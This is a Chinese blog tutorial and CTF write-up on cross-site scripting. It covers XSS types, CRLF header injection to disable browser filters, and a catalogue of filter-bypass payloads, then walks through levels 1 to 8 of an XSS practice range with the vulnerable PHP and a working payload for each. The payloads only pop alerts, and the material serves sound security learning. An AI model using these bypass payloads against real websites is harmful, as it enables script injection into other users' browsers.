id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/" itemprop="url">CTF</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/xss/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>xss</span></a></span></div></div><h1 class="post-title" itemprop="name headline">xss学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-02-10T08:18:03.000Z" title="Created 2024-02-10 16:18:03">2024-02-10</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-04-20T12:30:03.844Z" title="Updated 2025-04-20 20:30:03">2025-04-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为福建"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>福建</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2024/02/10/xss%E5%AD%A6%E4%B9%A0_max/xss%E5%AD%A6%E4%B9%A0/"><header><a class="post-meta-categories" href="/categories/CTF/" itemprop="url">CTF</a><a href="/tags/xss/" tabindex="-1" itemprop="url">xss</a><h1 id="CrawlerTitle" itemprop="name headline">xss学习</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Sherlock</span><time itemprop="dateCreated datePublished" datetime="2024-02-10T08:18:03.000Z" title="Created 2024-02-10 16:18:03">2024-02-10</time><time itemprop="dateCreated datePublished" datetime="2025-04-20T12:30:03.844Z" title="Updated 2025-04-20 20:30:03">2025-04-20</time></header><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”的威胁，而静态站点则完全不受其影响。恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的</p>
<p>xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是<strong>寻找参数未过滤的输出函数</strong></p>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>反射型XSS：<code>&lt;非持久化&gt;</code></p>
<p> 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。DOM型XSS由于危害较小，我们将其归为反射型XSS</p>
<p>存储型XSS：<code>&lt;持久化&gt;</code></p>
<p>代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie(虽然还有种DOM型XSS，但是也还是包括在存储型XSS内)</p>
<p><strong>dom型与反射型的区别：</strong></p>
<p>在dom型中输入的内容并不会出现在响应体里面（源码里面也不会）</p>
<p>响应体是我的输入会经过后端，经过后端渲染后再返回到前端；dom型是直接通过前端的js代码把我的输入插入到页面中进行实时渲染，这个时候并不是后端反应给我的，dom型没有向后端发起任何请求，而按F12可以看到输入的内容插入到源码中是因为其返回的是实时渲染的结果</p>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>js伪协议：就是把<code>javascript:</code> :后面的代码当JavaScript来执行</p>
<hr>
<p>使用htmlspecialchars函数把预定义的字符<code>&amp;、”、 ’、&lt;、&gt;</code>转换为HTML实体，防止浏览器将其作为HTML元素</p>
<p>但是默认是只编码双引号的，而且单引号无论如何都不转义。</p>
<p>预定义的字符是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- &amp; （和号）成为 &amp;amp;</span><br><span class="line">- &quot; （双引号）成为 &amp;quot;</span><br><span class="line">- &#x27; （单引号）成为 &#x27;</span><br><span class="line">- &lt; （小于）成为 &amp;lt;</span><br><span class="line">- &gt; （大于）成为 &amp;gt;</span><br></pre></td></tr></table></figure>

<h3 id="CRLF注入漏洞"><a href="#CRLF注入漏洞" class="headerlink" title="CRLF注入漏洞"></a>CRLF注入漏洞</h3><p>这也就牵扯到CRLF漏洞了</p>
<p>在 HTTP 协议中，CRLF 被用来分隔 HTTP 请求和响应中的各个部分。</p>
<p>CRLF 是回车符（carriage return，CR）和换行符（line feed，LF）的缩写，它们通常被一起使用来表示一行的结束。CRLF 漏洞（也称为 HTTP 报头注入漏洞）是一种 Web 应用程序安全漏洞，攻击者可以利用这个漏洞向 HTTP 响应中注入任意的 HTTP 头或者响应体，一般攻击者可以通过在输入中注入 CRLF 字符来改变 HTTP 响应的内容，从而实现恶意操作。</p>
<p>比如有一个搜索关键词的网站利用GET的形式传参</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp:?key=aaa</span><br></pre></td></tr></table></figure>

<p>如果该网站存在CRLF漏洞，那么我们就可以利用回车符&#x2F;换行符进行绕过过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key=%0d%0a%0d%0a&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>我们抓一下包看一下返回包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Date:xxxxxxxxxx</span><br><span class="line"></span><br><span class="line">Content-type:text/html</span><br><span class="line"></span><br><span class="line">Contet-Length:xxx</span><br><span class="line"></span><br><span class="line">Connection:close</span><br><span class="line"></span><br><span class="line">Location:</span><br><span class="line"></span><br><span class="line">&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>

<p>浏览器会根据第一个CRLF把HTTP包分成header和body，然后将体显示出来。于是我们这里这个标签就会显示出来，造成一个XSS</p>
<p>浏览器的Filter是浏览器应对一些反射型XSS做的保护策略，当url中含有XSS相关特征的时候就会过滤掉不显示在页面中，所以不能触发XSS。</p>
<p>怎样才能关掉filter？一般来说用户这边是不行的，只有数据包中http头含有<code>X-XSS-Protection</code>并且值为0的时候，浏览器才不会开启filter。</p>
<p>我们可以将<code>X-XSS-Protection:0</code>注入到数据包中，再用两个<code>CRLF</code>来注入XSS代码，这样就成功地绕过了浏览器<code>filter</code>，并且执行我们的反射型XSS</p>
<h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><h4 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h4><p><strong>eval</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(Evi1s7)&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>top</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](Evi1s7)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>window</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>self</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;self[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>parent</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;parent[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>frames</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;frames[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换"></a>函数替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Map.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Array.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;WeakSet.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;constructor.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].find(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].every(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].filter(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].forEach(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].findIndex(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>以上只是利用<code>&lt;img&gt;</code>标签进行举例，也可以在别的标签中使用</p>
<h4 id="嵌套绕过"><a href="#嵌套绕过" class="headerlink" title="嵌套绕过"></a>嵌套绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(&#x27;Evi1s7&#x27;)&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure>

<p>在这一段代码中，由于标签名被拆分成两部分，浏览器会将第一个尖括号视为标签名的起始符号，而第二个尖括号则是<code>&lt;script&gt;</code> 标签的起始符号，导致浏览器误以为有两个标签被嵌套在一起，从而实现我们的XSS攻击</p>
<h4 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h4><p>需要注入点存在href属性或者src属性，才可以利用url编码转义</p>
<p>（注意在url解析过程中，不能对协议类型进行任何的编码操作）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(1)&gt;Evi1s7&lt;/a&gt;</span><br><span class="line">#</span><br><span class="line">&lt;a href=javascript:%61%6c%65%72%74%28%31%29&gt;Evi1s7&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h4 id="scr和href属性"><a href="#scr和href属性" class="headerlink" title="scr和href属性"></a>scr和href属性</h4><h6 id="1-src属性"><a href="#1-src属性" class="headerlink" title="1.src属性"></a><strong>1.src属性</strong></h6><p>总的来说，<code>src</code>属性通常用于指定外部资源的URL，让浏览器从指定的URL中获取资源并加载它们。</p>
<p><code>&lt;script&gt;</code>标签</p>
<p><code>src</code>属性用于指定引入外部JavaScript文件的URL</p>
<p><code>&lt;img&gt;</code>标签</p>
<p><code>src</code>属性用于指定要显示的图像的URL</p>
<p><code>&lt;iframe&gt;</code>标签</p>
<p><code>src</code>属性用于指定要嵌入的另一个文档的URL。</p>
<p><code>&lt;audio&gt;</code>和<code>&lt;video&gt;</code>标签</p>
<p><code>src</code>属性用于指定要播放的音频或视频的URL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio controls&gt;</span><br><span class="line">  &lt;source src=&quot;path/to/your/audio.mp3&quot; type=&quot;audio/mp3&quot;&gt;</span><br><span class="line">&lt;/audio&gt;</span><br><span class="line">&lt;video controls&gt;</span><br><span class="line">  &lt;source src=&quot;path/to/your/video.mp4&quot; type=&quot;video/mp4&quot;&gt;</span><br><span class="line">&lt;/video&gt;</span><br></pre></td></tr></table></figure>

<h6 id="2-href属性"><a href="#2-href属性" class="headerlink" title="2.href属性"></a><strong>2.href属性</strong></h6><p>总的来说，<code>href</code>属性通常用于指定链接目标的URL或外部资源的URL，以及用于指定基准URL或图像地图中区域的URL。</p>
<p><code>&lt;a&gt;</code>标签</p>
<p><code>href</code>属性用于指定链接目标的URL。</p>
<p><code>&lt;link&gt;</code>标签</p>
<p><code>href</code>属性用于指定外部样式表的URL。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;path/to/your/stylesheet.css&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><code>&lt;base&gt;</code>标签</p>
<p><code>href</code>属性用于指定基准URL，所有相对URL都将以该URL为基础。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;base href=&quot;https://www.example.com/&quot;&gt;</span><br><span class="line">&lt;a href=&quot;path/to/your/page.html&quot;&gt;Link Text&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><code>&lt;area&gt;</code>标签</p>
<p><code>href</code>属性用于指定图像地图中区域的URL。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;path/to/your/image.jpg&quot; alt=&quot;Your Image&quot; usemap=&quot;#your-map&quot;&gt;</span><br><span class="line">&lt;map name=&quot;your-map&quot;&gt;</span><br><span class="line">  &lt;area shape=&quot;rect&quot; coords=&quot;0,0,100,100&quot; href=&quot;path/to/your/page.html&quot;&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<h4 id="绕过"><a href="#绕过" class="headerlink" title="()绕过"></a>()绕过</h4><p><strong>1.利用反引号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><strong>2.throw绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert;throw 1&lt;/script&gt;</span><br><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="单引号过滤"><a href="#单引号过滤" class="headerlink" title="单引号过滤"></a>单引号过滤</h4><p>1.可以利用斜杠替换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/Evi1s7/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>2.利用反引号替换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(`Evi1s7`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h4><p>可以利用拆分法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;a=&#x27;document.write(&quot;&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;&lt;a href=ht&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;tp://VPS-IP:po&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;rt&gt;Evi1s7&lt;/a&gt;&quot;)&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(a)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>利用eval()函数将字符串解析为可执行的代码，从而进行拼接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&quot;&lt;a href=http://VPS-IP:port&gt;Evi1s7&lt;/a&gt;&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="分号绕过"><a href="#分号绕过" class="headerlink" title="分号绕过"></a>分号绕过</h4><p>当只过滤了分号时，可以利用花括号进行语句隔离</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&#123;onerror=alert&#125;throw 1&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="xss挑战之旅"><a href="#xss挑战之旅" class="headerlink" title="xss挑战之旅"></a>xss挑战之旅</h2><p>靶场：<a target="_blank" rel="noopener" href="http://test.ctf8.com/">http://test.ctf8.com/</a></p>
<h3 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;name&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>没有任何过滤，直接：<code>/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</code>，弹出弹窗，进入下一关</p>
<h3 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.$str.&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br></pre></td></tr></table></figure>

<p><code>$str</code>被双引号包含，所以我们需要先包含双引号后再xss：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，或者 <code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;</code> 弹出弹窗，进入下一关</p>
<h3 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p>payload：<code>&#39;onclick=&#39;alert(1)</code>r然后再点击一下输入框就成功了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&#x27;&#x27;onclick=&#x27;alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level4.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.$str3.&#x27;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>payload：<code>&quot;onclick=&quot;alert(1)</code></p>
<h3 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level5.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>payload：<code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code>，利用浏览器自动校正轻微语法错误</p>
<h3 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level6.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>该题有多种payload，基本上只要把前几题改下大小写就可以了</p>
<h3 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$str =strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;rcs&quot;,&quot;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level7.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>全转换成小写了，大小写不管用，但是可以双写绕过：<code>&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;&lt;&quot;</code></p>
<h3 id="level-8（HTML实体绕过）"><a href="#level-8（HTML实体绕过）" class="headerlink" title="level-8（HTML实体绕过）"></a>level-8（HTML实体绕过）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span><br><span class="line">echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<p>可以用HTML实体来绕过过滤: <code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p>
<p>HTML实体：字符实体是用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读</p>
